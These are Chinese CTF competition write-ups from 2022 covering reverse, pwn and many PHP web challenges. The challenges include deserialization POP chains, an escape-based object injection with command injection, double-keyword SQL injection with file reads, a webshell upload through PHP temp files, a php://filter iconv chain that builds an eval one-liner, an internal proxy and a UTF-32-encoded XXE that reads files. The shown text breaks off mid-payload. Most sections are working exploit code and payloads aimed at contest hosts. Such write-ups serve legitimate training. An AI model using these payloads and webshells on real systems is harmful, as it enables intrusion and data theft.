from z3 import *v21=Int(&#x27;v21&#x27;)v22=Int(&#x27;v22&#x27;)v23=Int(&#x27;v23&#x27;)v24=Int(&#x27;v24&#x27;)v31=Int(&#x27;v31&#x27;)v32=Int(&#x27;v32&#x27;)v33=Int(&#x27;v33&#x27;)s=Solver()s.add(65*v33+24*v32+118*v31+126*v24+173*v23+179*v22+195*v21==0xFE5F)s.add(277*v33+236*v32+433*v31+484*v24+228*v23+142*v22+261*v21==0x28113)s.add(496*v33+309*v32+46*v31+135*v24+165*v23+7*v22+495*v21==152196)s.add(236*v33+250*v32+41*v31+247*v24+67*v23+251*v22+471*v21==0x1EFA4)s.add(457*v33+414*v32+271*v31+32*v24+244*v23+74*v22+113*v21==0x24273)s.add(221*v33+76*v32+263*v31+363*v24+49*v23+82*v22+405*v21==0x1B1AA)s.check()a=&quot;Yqc77YD8jc&#x27;&#x27;&quot;e=&#x27;&#x27;r=s.model()&quot;&quot;&quot;[v21 = 71, v22 = 48, v23 = 100, v24 = 77, v31 = 52, v32 = 116, v33 = 104]&quot;&quot;&quot;r=[71, 48, 100, 77, 52, 116, 104]for i in r:    e=e+chr(i)for i in a:    e=e+chr(((ord(i)-1)^7))print(e)


pwnreader利用edit中的偏移 向0x4260处写入0x200个字符，可以覆盖stream和filename变量
from pwn import *def edit(off,data):    p.sendlineafter(&#x27;Exit&#x27;,&#x27;3&#x27;)    p.sendlineafter(&#x27;offset: &#x27;,str(off))    p.sendafter(&#x27;data: &#x27;,data)def open():    p.sendlineafter(&#x27;Exit&#x27;,&#x27;1&#x27;)def read():    p.sendlineafter(&#x27;Exit&#x27;,&#x27;2&#x27;)def close():    p.sendlineafter(&#x27;Exit&#x27;,&#x27;4&#x27;)#p=process(&#x27;./reader&#x27;)p=remote(&#x27;1.14.97.218&#x27;,&#x27;22385&#x27;)open()read()#gdb.attach(p,&#x27;b open&#x27;)edit(0x200,p64(0)+p64(0)+p64(0)*2+b&quot;./flag\x00&quot;)open()p.interactive()


webTryGetPasswd赛后复现
&lt;?php$passwd = getenv(&quot;passwd&quot;);# passwd 的格式为 [a-zA-z0-9]&#123;10&#125;$hintfile = &quot;/tmp/hint&quot;.$passwd;system(&quot;touch $hintfile&quot;);if (isset($_GET[&#x27;passwd&#x27;]))&#123;    foreach ((new DirectoryIterator($_GET[&#x27;dir&#x27;])) as $file)&#123;        echo $file-&gt;getSize().&quot;\n&lt;br&gt;&quot;;    &#125;    if ($_GET[&quot;passwd&quot;]===$passwd)&#123;        eval($_GET[&quot;cmd&quot;]);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;

获取到passwd后可以rce，而DirectoryIterator可以列目录，它的参数支持glob://伪协议，当存在文件时$file-&gt;getSize()有回显回显，这样就可以通过脚本遍历获取到passwd
import requestsurl=&quot;http://80.endpoint-ab681a0db3214901a65a00b23c616372.dasc.buuoj.cn:81/?passwd=123&amp;dir=glob:///tmp/hint&quot;b=&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;data=&quot;&quot;for i in range(10):    for j in b:        r=requests.get(url+data+j+&#x27;*&#x27;)        if &#x27;0&#x27; in r.text:            data=data+j            break    print(data)print(data)



拿到passwd：st1sOFAblF，进行rce

ezGadget01赛后复现
&lt;?phpclass Ez&#123;    function __construct()    &#123;    &#125;    function __destruct()    &#123;        $this-&gt;run();    &#125;    function run()    &#123;        echo &quot;exit&quot;;    &#125;&#125;class Junit&#123;    private $judge;    function __construct()    &#123;        $this-&gt;judge = False;    &#125;    function e($arguments)    &#123;        if($this-&gt;judge)        &#123;            eval(implode(&quot;, &quot;, $arguments));        &#125;    &#125;&#125;class Ez1&#123;    function __construct()    &#123;    &#125;    function __destruct()    &#123;        $this-&gt;get();    &#125;    function get()    &#123;        echo &quot;get&quot;;    &#125;&#125;class Space&#123;    protected $name;    function __construct($name)    &#123;        $this-&gt;name = $name;    &#125;    function __wakeup()    &#123;        echo &quot;My name is &quot; . $this-&gt;name;    &#125;&#125;class CallFunction&#123;    private $num;    public $func;    function __construct()    &#123;        $this-&gt;num = 5;    &#125;    function __call($function, $arguments)    &#123;        if($this-&gt;num &gt; 10)        &#123;            call_user_func($this-&gt;func, $arguments);        &#125;    &#125;&#125;class chain&#123;    private $name;    function __construct($name)    &#123;        $this-&gt;name = $name;    &#125;    function __set($func, $name)    &#123;        echo $func;    &#125;&#125;class Proc01&#123;    public $param;    function __construct()    &#123;        $this-&gt;param = &quot;whoami&quot;;    &#125;    function __toString()    &#123;        if(isset($this-&gt;param))        &#123;            system(&quot;whoami&quot;);        &#125;        return $this-&gt;param-&gt;arg;    &#125;&#125;class SetName&#123;    private $app;    protected $args;    function __construct()    &#123;    &#125;    function __isset($name)    &#123;        $this-&gt;app-&gt;list($this-&gt;args);    &#125;&#125;class GetName&#123;    private $app;    protected $args;    function __construct()    &#123;    &#125;    function __get($name)    &#123;        $this-&gt;app-&gt;list($this-&gt;args);    &#125;&#125;if(isset($_GET[&#x27;b&#x27;]))&#123;    unserialize(base64_decode($_GET[&#x27;b&#x27;]));&#125;else&#123;    highlight_file(__FILE__);&#125;

在Junit类中存在e方法会执行eval函数可以利用CallFunction类中的__call方法调用Junit类中e方法利用GetName类中的__get方法触发CallFunction类中的__call方法利用Proc01类中的__toString方法触发GetName类中的__get方法利用Space类中的__wakeup方法触发Proc01类中的__toString方法
调用顺序:Space-&gt;Proc01-&gt;GetName-&gt;CallFunction-&gt;Junit
&lt;?phpclass Junit&#123;    private $judge;    function __construct()    &#123;        $this-&gt;judge = True;    &#125;&#125;class CallFunction&#123;    private $num;    public $func;    function __construct()    &#123;        $this-&gt;num=20;        $this-&gt;func=[new Junit(),&quot;e&quot;];    &#125;&#125;class GetName&#123;    private $app;    protected $args;    function __construct()    &#123;        $this-&gt;app=new CallFunction();        $this-&gt;args=&quot;system(&#x27;ls&#x27;);&quot;;    &#125;&#125;class Proc01&#123;    public $param;    function __construct()    &#123;       $this-&gt;param=new GetName();    &#125;&#125;class Space&#123;    protected $name;    function __construct()    &#123;        $this-&gt;name=new Proc01();    &#125;&#125;$a=new Space();echo base64_encode(serialize($a));


决赛疫情原因线上awd。Rank: 2
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>awd</tag>
        <tag>台州</tag>
        <tag>2022竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2022强国杯技术技能大赛初赛wp</title>
    <url>/posts/fc877f48/</url>
    <content><![CDATA[Rank: 10，（东部赛区太卷了吧）

webupload_lol先传.htaccess，再传图片马，getshell

有个内容检测，php版本为5，用script标签绕过即可

ezpop_new源码
&lt;?phpfunction filter($string) &#123;    $safe = array(&#x27;system&#x27;,&#x27;fopen&#x27;,&#x27;fread&#x27;,&#x27;file_get_contents&#x27;,&#x27;flag&#x27;);    $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;    return preg_replace($safe, &#x27;nonono&#x27;, $string);&#125;class PingUtils&#123;    function __call($name,$args)&#123;        system(&quot;ping -c4 $&#123;args[0]&#125;&quot;);    &#125;&#125;class Cindy&#123;    var $someone;    var $phone;    function call()&#123;        $this-&gt;phone-&gt;call($this-&gt;someone);    &#125;&#125;class Bob&#123;    public $flag=True;    public function __get($a)&#123;        if($this-&gt;flag)&#123;            $cindy = new Cindy();            $cindy-&gt;someone =  $_REQUEST[&#x27;someone&#x27;];            $cindy-&gt;phone = &quot;p50&quot;;            #var_dump(filter(serialize($cindy)));            $cindy = unserialize(filter(serialize($cindy)));            $cindy-&gt;call($someone);        &#125;else&#123;            echo &#x27;nonono&#x27;;        &#125;    &#125;    public function __wakeup()&#123;        $this-&gt;flag = False;    &#125;&#125;class Alice&#123;        public function __destruct()&#123;        echo $this-&gt;c-&gt;b;    &#125;&#125;highlight_file(__FILE__);@unserialize($_GET[&#x27;pop&#x27;]);

从入口先到__destruct()，往下走只能是echo触发__toString或者$this-&gt;c-&gt;b，对于$this-&gt;c触发__get，这里显然只有__get能用

但是进入__get中利用的部分需要条件if($this-&gt;flag)，显然
public function __wakeup()&#123;        $this-&gt;flag = False;    &#125;
会阻碍这个条件成立
由于题目中的PHP版本合适,可以采用修改超过成员数目来绕过wakeup
payload:?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;
进入下一个利用部分，考察反序列化字符串替换溢出
利用点在
class PingUtils&#123;    function __call($name,$args)&#123;        system(&quot;ping -c4 $&#123;args[0]&#125;&quot;);    &#125;&#125;
而此又需要从
class Cindy&#123;    var $someone;    var $phone;    function call()&#123;        $this-&gt;phone-&gt;call($this-&gt;someone);    &#125;&#125;
触发
但是此处的赋值是无法实现这个功能的
$cindy = new Cindy();$cindy-&gt;someone =  $_REQUEST[&#x27;someone&#x27;];$cindy-&gt;phone = &quot;p50&quot;;


利用点在
$cindy = unserialize(filter(serialize($cindy)));
其中的filter会对反序列化后的字符串进行特定值替换,然后再解压

            所以可以通过赋值特定字符串触发filter中的过滤实现溢出,从而达到后面自PingUtils类到filter这条链的利用因为序列化后的字符串中是依靠特定位置的数字来标示其后的属性内容的长度,这个非等长替换就会导致在反序列化解析时出现整体的偏移,原本的作为结构的部分被偏移到属性内容的部分,属性内容的部分值又会偏移视为结构的部分构造足够多的非等长替换,就能偏移出一个完整结构部分,在里面定义出需要的属性一个序列化后的字符串如果存在多余无法正常解析的部分,这部分前面如果能被正常解析,那么多余部分在解析时会被抛弃掉，所以构造产生多余数据不用担心，会被忽略掉
          



构造出payload:someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|ls  /&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;

            对于payload来说，在filter替换前$cindy-&gt;someone属性的值序列化字符串表示是 s:5:&quot;cindy&quot;;s:224:&quot;PAYLOADSTRING....&quot;这样但是filter替换会把fread换成nonono即长度5的字符串变成长度6但此时$cindy-&gt;someone属性用来表示其值 这一字符串的长度的数字还是224没变但实际上替换后值字符串的总长度由224变成了224+35(有35个fread替换为了nonono)所以反序列化只会取值字符串前224个字符作为$cindy-&gt;someone属性反序列化后的值剩下35则会被当成反序列化字符串中的结构部分杯解析即在PHP看来整个字符串是这样的&quot;cindy&quot;;s:224:&quot;AfterPayloadString...&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:{}}在cindy属性后面还有一个属性phone,其值是个名为PingUtils的对象注意最末尾的}.这个将于整个反序列化字符串开始的{闭合,PHP将把这个看作反序列化字符串的结尾只有后面的内容由于结构不完整PHP并不会解析,而是直接抛弃并且不会产生任何报错
          


读取flag：?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;&amp;someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|nl /*&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;
file_sql_new赛后复现
sql注入，过滤了一次select
双写select绕过
payload：
http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),3%23

http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(selselectect(group_concat(column_name))from(information_schema.columns)where((table_name)=(%27fl4g%27))),3%23

http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(fllllag)from(fl4g)),3%23

http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seleselectct(hex(load_file(%22/var/www/html/flag.php%22)))),3%23

得到3C3F7068700A0A24666C6167203D207B6C69726768793864757370717A6A6631623735636E6561773330343974766D787D3B0A6563686F20226161223B0A3F3E0A，转字符串即可得到flag
ezweb_new赛后复现
&lt;?php    highlight_file(__FILE__);    $_=@$_GET[&#x27;‮imaohw?⁦⁩⁦whoami&#x27;];//    $__=&quot;/var/www/html&quot;;    if($_ &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@&lt;?php&#x27;)&#123;        include($_);    &#125;    foreach ($_GET as $key =&gt; $value) &#123;        $$key = $value;    &#125;    var_dump(scandir($__));


上来有个小陷阱，在传参的地方，用鼠标选，会发现注释处左右的字符串不受你控制，这里考的就是unicode字符串了
当复制代码进某些编辑器中可以看到识别到了一些Unicode字符串,参数很明显不是whoami了
将[U+202E]等进行Url编码，得到%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami
继续往下看，可以有两种方法做
方法一：PHP崩溃getshell
使php崩溃后保留下临时文件，然后利用scandir查文件名，最后包含达到getshell
写马：
import requestsurl = &quot;http://82.157.177.192:46728/?%E2%80%AEimaohw%3F%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/string.strip_tags/resource=/etc/passwd&quot;paramsMultipart = [(&#x27;file&#x27;, (&#x27;a.php&#x27;, &quot;@&lt;?php\r\neval(\x24_POST[&#x27;a&#x27;]);\r\necho 123;\r\n?&gt;&quot;, &#x27;application/octet-stream&#x27;))]requests.post(url,files=paramsMultipart)

查文件名：http://82.157.177.192:46728/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=1&amp;__=/tmp/

getshell：http://82.157.177.192:46728/??%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=/tmp/phpsxtpjV

方法二：filter构造一句话rce
原理参考1原理参考2
项目地址
师傅们如果生成出来的payload不能用的话可以试试切换系统，比如用ubuntu或者kali或者debian试试（不要用windows，因为在windows下文件名不区分大小写），还有php版本尽量跟题目保持一致，否则服务器上的iconv默认支持和靶机不一样，就会无效。要是还不行就试试项目中的fuzzer.php，重新构造下(我构造这个花了一天的时间，呜呜呜)
我的poc
file_to_use = &quot;/etc/passwd&quot;#@&lt;?php eval($_POST[2]);;?&gt;base64_payload = &quot;QDw/cGhwIGV2YWwoJF9QT1NUWzJdKTs7Pz4K&quot;# generate some garbage base64filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;filters += &quot;convert.base64-encode|&quot;# make sure to get rid of any equal signs in both the string we just generated and the rest of the filefilters += &quot;convert.iconv.UTF8.UTF7|&quot;for c in base64_payload[::-1]:        if(c==&quot;/&quot;):            c=&quot;%2f&quot;        filters += open(&#x27;./res/&#x27;+c).read() + &quot;|&quot;        # decode and reencode to get rid of everything that isn&#x27;t valid base64        filters += &quot;convert.base64-decode|&quot;        filters += &quot;convert.base64-encode|&quot;        # get rid of equal signs        filters += &quot;convert.iconv.UTF8.UTF7|&quot;filters += &quot;convert.base64-decode&quot;final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;with open(&#x27;test.php&#x27;,&#x27;w&#x27;) as f:    f.write(&#x27;&lt;?php echo file_get_contents(&quot;&#x27;+final_payload+&#x27;&quot;);?&gt;&#x27;)print(final_payload)




            http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwdPOST2&#x3D;system(‘ls’);
          


用上面两种方法都能getshell，但是会发现读不了flag，没权限
用ps -aux命令看下进程，发现root用户开了个tomcat服务

curl试一下tomcat的默认8080端口，有内容

但是命令行不好做题，就先考虑代理出来
web根目录下传个proxy.php，注意修改下地址
项目地址
&lt;?php /* *    PHP接口代理转发：    以Golang接口转发为例；    如有必要，请设置内网IP为白名单；    建议内网接口返回格式：Content-Type: text/html; charset=UTF-8； *    使用示例：    $host = &quot;http://127.0.0.2&quot;; // 外网网址（主网址或有部分路径）    $intranet = &#x27;http://127.0.0.4&#x27;; // 内网网址（主网址或有部分路径）    $php_proxy = new php_proxy();    $back = $php_proxy-&gt;request_intranet($host, $intranet);    echo $back; * */class php_proxy&#123;     // 发送get、post请求    public function request_option($request_url=&#x27;&#x27;, $method=&#x27;post&#x27;, $request_data=[], $to_json=false): string&#123;        if (empty($request_url)) &#123;            $back = &#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;request_url is null&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;;        &#125;else&#123;            if ($method == &#x27;post&#x27; || $method == &#x27;POST&#x27;)&#123;                $body = http_build_query($request_data);                $options = [                    &#x27;http&#x27; =&gt; [                        &#x27;method&#x27; =&gt; &#x27;POST&#x27;, // 注意要大写                        &#x27;header&#x27; =&gt; &#x27;Content-type:application/x-www-form-urlencoded&#x27;,                        &#x27;content&#x27; =&gt; $body,                        &#x27;ignore_errors&#x27;=&gt; true, // 忽略报错，直接返回接口内容                    ],                ];                $context = stream_context_create($options);                $data = file_get_contents($request_url, false, $context);            &#125;else if ($method == &#x27;get&#x27;|| $method == &#x27;GET&#x27;)&#123;                $curl = curl_init();                curl_setopt($curl, CURLOPT_URL, $request_url);                curl_setopt($curl, CURLOPT_HEADER, 0); // 不抓取头部信息。只返回数据                curl_setopt($curl, CURLOPT_TIMEOUT, (int)60000); // 超时设置                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); // 1表示不返回bool值                $data = curl_exec($curl);                // $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); // 获取接口状态码                curl_close($curl);            &#125;else&#123;                $data = &#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;;            &#125;             $back = $data;        &#125;         if ($to_json == true)&#123;            $res = json_encode($back, true);        &#125;else&#123;            $res = $back;        &#125;         return $res;    &#125;     // 获取完整网址    public function get_url(): string&#123;        if(isset($_SERVER[&#x27;HTTPS&#x27;]) &amp;&amp; $_SERVER[&#x27;HTTPS&#x27;] == &#x27;on&#x27;) &#123;            $url = &#x27;https://&#x27;;        &#125;else&#123;            $url = &#x27;http://&#x27;;        &#125;        //这里的逻辑会导致访问内网的URI与内网相同        //采用PATH_INFO的模式来表示内网需要的URI        //即 外 http://127.0.0.1/proxy.php/index =&gt; 内 http://127.0.0.1/index        // return $url.$_SERVER[&#x27;SERVER_NAME&#x27;].&#x27;:&#x27;.$_SERVER[&#x27;SERVER_PORT&#x27;].$_SERVER[&#x27;REQUEST_URI&#x27;];        return $url.$_SERVER[&#x27;SERVER_NAME&#x27;].&#x27;:&#x27;.$_SERVER[&#x27;SERVER_PORT&#x27;].$_SERVER[&#x27;PATH_INFO&#x27;];    &#125;     // 是post    public function is_post(): bool&#123;        return isset($_SERVER[&#x27;REQUEST_METHOD&#x27;]) &amp;&amp; strtoupper($_SERVER[&#x27;REQUEST_METHOD&#x27;]) == &#x27;POST&#x27;;    &#125;     // 是get    public function is_get(): bool&#123;        return isset($_SERVER[&#x27;REQUEST_METHOD&#x27;]) &amp;&amp; strtoupper($_SERVER[&#x27;REQUEST_METHOD&#x27;]) == &#x27;GET&#x27;;    &#125;     // 生成内网网址：把外网网址解析到内网网址    public function make_request_url($host, $intranet): string&#123;        return str_replace($host, $intranet, $this-&gt;get_url()); // 实际代理地址（就是替换主网址或路径）    &#125;     // 转发接口    // 请从此处调用    public function request_intranet($host, $intranet): string&#123;        // 测试的内网请求地址：$request_url = http://127.0.0.l:8000/api.gen1/admin        $request_url = $this-&gt;make_request_url($host, $intranet);        if ($this-&gt;is_post())&#123;            $request_array = $_REQUEST; // 请求参数数组            $back = $this-&gt;request_option($request_url, &#x27;post&#x27;, $request_array, false);        &#125;else if ($this-&gt;is_get())&#123;            $request_array = [];            $back = $this-&gt;request_option($request_url, &#x27;get&#x27;, $request_array, false);        &#125; else&#123;            $back = &#x27;&#123;&quot;state&quot;:0, &quot;msg&quot;:&quot;method error. method is only in [get, post], options etc be not supported.&quot;, &quot;content&quot;:&quot;&quot;&#125;&#x27;;        &#125;        return $back;    &#125;&#125;// 返回数据$host = &quot;http://82.157.177.192:46728&quot;; // 外网网址（主网址或有部分路径）$intranet = &#x27;http://127.0.0.1:8080&#x27;; // 内网网址（主网址或有部分路径）$php_proxy = new php_proxy();$back = $php_proxy-&gt;request_intranet($host, $intranet);echo $back;?&gt;

之后访问http://IP:PORT/proxy.php/index，就相当于访问http://InnerIP:InnerPORT/index

抓包一看，很明显的XXE
fuzz一下，可恶，竟然还有waf

可以利用编码转换绕过waficonv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml
这里放一个编码后的payload（本地dtd读文件报错带flag）：%3C%00%00%00%3F%00%00%00x%00%00%00m%00%00%00l%00%00%00+%00%00%00v%00%00%00e%00%00%00r%00%00%00s%00%00%00i%00%00%00o%00%00%00n%00%00%00%3D%00%00%00%22%00%00%001%00%00%00.%00%00%000%00%00%00%22%00%00%00+%00%00%00%3F%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00D%00%00%00O%00%00%00C%00%00%00T%00%00%00Y%00%00%00P%00%00%00E%00%00%00+%00%00%00m%00%00%00e%00%00%00s%00%00%00s%00%00%00a%00%00%00g%00%00%00e%00%00%00+%00%00%00%5B%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00l%00%00%00o%00%00%00c%00%00%00a%00%00%00l%00%00%00_%00%00%00d%00%00%00t%00%00%00d%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00t%00%00%00m%00%00%00p%00%00%00%2F%00%00%001%00%00%00.%00%00%00d%00%00%00t%00%00%00d%00%00%00%22%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%25%00%00%00+%00%00%00c%00%00%00o%00%00%00n%00%00%00d%00%00%00i%00%00%00t%00%00%00i%00%00%00o%00%00%00n%00%00%00+%00%00%00%27%00%00%00a%00%00%00a%00%00%00a%00%00%00%29%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00%21%00%00%00E%00%00%00N%00%00%00T%00%00%00I%00%00%00T%00%00%00Y%00%00%00+%00%00%00%26%00%00%00%23%00%00%00x%00%00%002%00%00%005%00%00%00%3B%00%00%00+%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00+%00%00%00S%00%00%00Y%00%00%00S%00%00%00T%00%00%00E%00%00%00M%00%00%00+%00%00%00%22%00%00%00f%00%00%00i%00%00%00l%00%00%00e%00%00%00%3A%00%00%00%2F%00%00%00%2F%00%00%00%2F%00%00%00f%00%00%00l%00%00%00a%00%00%00g%00%00%00%22%